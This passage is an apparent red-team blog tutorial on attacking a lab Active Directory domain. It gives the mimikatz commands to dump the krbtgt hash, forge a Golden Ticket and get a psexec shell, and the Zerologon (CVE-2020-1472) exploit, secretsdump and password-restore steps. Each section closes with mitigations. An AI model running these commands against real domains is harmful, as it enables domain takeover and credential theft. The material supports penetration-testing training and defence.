+<h2 id="golden-ticket-attack">Golden-Ticket-Attack</h2>
+<hr>
+<h3 id="what-is-a-golden-ticket">What is a Golden Ticket?</h3>
+<p><strong>krbtgt</strong> Account - Kerebos Ticket Granting Ticket Account, allows us to <strong>generate tickets</strong></p>
+<p>If we have the hash for it, <strong>WE CAN GENERATE TICKETS</strong>!</p>
+<p>With this, we <strong>request access</strong> to any <strong>Resource</strong> or <strong>System on the Domain!</strong> using the <strong>Ticket Granting Service</strong></p>
+<h3 id="exploit-3">Exploit</h3>
+<pre><code>mimikatz.exe
+
+privilege::debug
+
+lsadump::lsa /inject /name:krbtgt
+</code></pre>
+<p>Whoa that&rsquo;s a lot of Information! <strong>What do we actually need?</strong></p>
+<ul>
+<li>
+<p><strong>SID</strong> of the <strong>Domain</strong></p>
+<pre><code>  S-1-5-21-301214212-3920777931-1277971883
+</code></pre>
+</li>
+<li>
+<p><strong>NTLM Hash</strong></p>
+<pre><code>  11f843aafd22acfb29aef92f6e423994
+</code></pre>
+</li>
+</ul>
+<p>Now, moving further</p>
+<p>Syntax:</p>
+<pre><code>kerberos::golden /User:Whatever /domain:{domain_name} /sid:{SID} /krbtgt:{NTLM_hash} /id:500 /ptt
+
+/id:500 	500 is the ID of Admin Account
+/ptt 		Pass the Ticket
+</code></pre>
+<p>We are going to <strong>generate a Golden Ticket</strong> here and then we are going to use <strong>Pass the Ticket</strong> and <strong>pass it along</strong> to the <strong>Next Session</strong>, so we are going to utilize that ticket to open up a <strong>Command Prompt</strong> which has access to any Computer on the Domain!</p>
+<p>So in our case:</p>
+<pre><code>kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-301214212-3920777931-1277971883 /krbtgt:11f843aafd22acfb29aef92f6e423994 /id:500 /ptt
+</code></pre>
+<p>After getting it done successfully,</p>
+<pre><code>misc::cmd
+</code></pre>
+<p>A Command Prompt opens up!</p>
+<pre><code>dir \\COMPUTERNAME\c$
+</code></pre>
+<p>How to get a shell?</p>
+<pre><code>psexec.exe \\COMPUTERNAME cmd.exe
+</code></pre>
+<br>
+<h3 id="mitigations-5">Mitigations</h3>
+<p>You can take one or more of these steps to protect against golden ticket attacks.</p>
+<ol>
+<li>
+<p>Enforce a least privilege access model.</p>
+<ul>
+<li>Limit user access to only what they need.</li>
+<li>Limit the amount of admin accounts to only those who absolutely need it and ensure admin access is not simply added to their day-to-day user account.</li>
+</ul>
+</li>
+<li>
+<p>Implement multi-factor authentication (MFA) on all external authentication points, including VPN and OWA/O365.</p>
+</li>
+<li>
+<p>Don’t have RDP open to the internet. Seriously. Port numbers don’t matter. Get RDP behind a VPN, and implement MFA on it.</p>
+</li>
+<li>
+<p>Fake credentials can be injected into the LSAS cache, which would be tempting to hackers. Seeing these “honeycreds” used would clearly indicate an issue.</p>
+</li>
+<li>
+<p>Perform the reset of the krbtgt account (twice) in accordance with your password reset policies, or quarterly.</p>
+</li>
+<li>
+<p>If possible, consider running LSAS in its available protected mode.</p>
+</li>
+<li>
+<p>Enable Windows Defender Credential Guard on applicable systems (Windows 10 and Server 2016 and above). Do not use on domain controllers.</p>
+</li>
+</ol>
+<br>
+<h2 id="zero-logon">Zero-Logon</h2>
+<hr>
+<h3 id="aka-cve-2020-1472">aka CVE-2020-1472</h3>
+<p><strong>Attacking</strong> the Domain Controller, <strong>Setting</strong> the <strong>Password</strong> to <strong>null</strong> and taking over the Domain Controller.</p>
+<p><strong>Issue:</strong> When we run the Attack, **and if we do not restore it, we break it **</p>
+<h3 id="resources-3">Resources</h3>
+<p><a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p>
+<br>
+<h3 id="exploit-4">Exploit</h3>
+<p>Check if Vulnerable</p>
+<pre><code>python3 zerologon.py COMPUTERNAME {dcip}
+</code></pre>
+<p>Now Let&rsquo;s Attack</p>
+<pre><code>python3 cve-2020-1472-exploit.py COMPUTERNAME {dcip}
+</code></pre>
+<p>Changed the Account Password to an Empty String</p>
+<p>How can we know that this is done??</p>
+<p>Lets dump out the secrets of the Machine</p>
+<pre><code>secretsdump.py -just-dc {domain}/{dc}\$@{dcip}
+
+$ =&gt; empty value
+
+secretsdump.py -just-dc DOMAINNAME/COMPUTERNAME\$@{dcip}
+</code></pre>
+<p>:)</p>
+<br>
+<p>Wait, How the hell do I restore this?</p>
+<p>Copy the Administrator Hash</p>
+<pre><code>secretsdump.py administrator@{dcip} -hashes adm1nha$h
+</code></pre>
+<p>Look for <code>plain_password_hex</code></p>
+<p>Now use the Restore Script</p>
+<pre><code>python3 restorepassword.py DOMAINNAME/COMPUTERNAME@COMPUTERNAME -target-ip {dcip} -hexpass {plain_password_hex}
+</code></pre>
+<p>Great!</p>
+<br>
+<h2 id="mitigations-6">Mitigations</h2>
+<ol>
+<li>
+<p>Patch. Apply the relevant <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472">Microsoft patch</a> as quickly as possible!</p>
+</li>
+<li>
+<p>Proactively close patch gaps. Non-Windows machines are still somewhat unprotected from ZeroLogon. Search your network for non-Windows computer accounts with elevated privileges (e.g. domain replication privileges) as these could be used to launch a successful ZeroLogon attack even on patched domain controllers. (Falcon Zero Trust can provide you with a complete list of privileged accounts.)</p>
+</li>
+<li>
+<p>If you cannot patch for any reason:</p>
+</li>
+</ol>
+<ul>
+<li>
+<p>An attacker exploiting the vulnerability effectively gets privileged access to a domain controller. Using this access, the attacker can harvest credentials and then perform one of the following attacks:</p>
+<ul>
+<li>Golden Ticket attack</li>
+<li>Pass-the-Hash attack</li>
+<li>Silver Ticket attack</li>
+</ul>
+</li>
+<li>
+<p>Falcon Zero Trust can prevent these attacks via enforced step-up authentication.</p>
+</li>
+<li>
+<p>To mitigate further damage, ensure you are monitoring your environment against such attacks:</p>
+<ul>
+<li>Enable multi-factor authentication (MFA) for all accounts or at least privileged accounts. In that case, even if a privileged account is compromised, the access attempt would still be denied.</li>
+<li>Monitor for possible exploitation attempts with the <a href="https://github.com/preempt/ntlm-scanner">open-source tool</a> released by CrowdStrike (formerly Preempt).</li>
+</ul>
+</li>
+</ul>
+<h2 id="next--part-4-post-exploitationhttpsautidevcompromising-ad-part-4-post-exploitation"><a href="https://auti.dev/compromising-ad-part-4-post-exploitation/">Next &raquo; Part 4: Post Exploitation</a></h2>
+
+</content>
+<p>
+  
+  <a href="https://auti.dev/blog/active-directory/">#active-directory</a>
+  
+  <a href="https://auti.dev/blog/cybersecurity/">#cybersecurity</a>
+  
+  <a href="https://auti.dev/blog/windows/">#windows</a>
+  
+  <a href="https://auti.dev/blog/red-teaming/">#red-teaming</a>
+  
+</p>
+
+  </main>
+  <footer>
+</footer>
+
+    
+</body>
+
+</html>
